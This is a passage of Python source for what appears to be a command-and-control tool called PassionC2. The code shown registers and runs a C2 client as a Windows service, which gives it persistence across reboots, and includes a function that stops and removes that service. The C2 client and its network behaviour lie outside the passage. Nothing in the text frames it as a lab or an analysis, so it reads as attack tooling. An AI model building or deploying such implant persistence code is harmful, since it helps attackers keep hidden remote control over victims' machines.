                win32event.SetEvent(self.hWaitStop)
                self.running = False
            
            def SvcDoRun(self):
                servicemanager.LogMsg(
                    servicemanager.EVENTLOG_INFORMATION_TYPE,
                    servicemanager.PYS_SERVICE_STARTED,
                    (self._svc_name_, '')
                )
                
                client = C2Client(config)
                client.run()
        
        win32serviceutil.HandleCommandLine(PassionC2Service)
        print("[+] Service installed successfully")
        
    except ImportError:
        print("[!] Service installation requires pywin32")
        print("    pip install pywin32")

def uninstall_service() -> None:
    """Remove Windows service"""
    if platform.system() != 'Windows':
        return
    
    try:
        import win32serviceutil
        win32serviceutil.StopService("PassionC2")
        win32serviceutil.RemoveService("PassionC2")
        print("[+] Service removed")
    except:
        print("[!] Failed to remove service")

# =============================================================================
# Entry Point
# =============================================================================

if __name__ == '__main__':
    main()